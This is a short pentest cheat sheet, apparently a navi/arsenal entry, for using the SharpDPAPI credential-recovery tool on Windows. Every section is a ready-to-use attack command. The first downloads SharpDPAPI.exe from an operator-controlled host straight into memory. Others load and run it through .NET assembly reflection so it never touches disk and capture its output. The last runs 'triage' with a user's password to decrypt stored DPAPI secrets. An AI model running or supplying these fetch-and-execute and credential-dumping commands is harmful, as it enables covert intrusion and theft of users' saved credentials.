# SharpDPAPI

% SharpDPAPI, dpapi
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## download into memory
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/windows/NetFramework_4.7_x64/SharpDPAPI.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
```


## file transfert - run csharp from memory (Assembly reflection) 
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_params: -group=user -full

## Triage user
```powershell
SharpDPAPI.exe triage /password:<password>
```

## Triage user (assembly reflection)
```powershell
$params="triage /password:<password>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
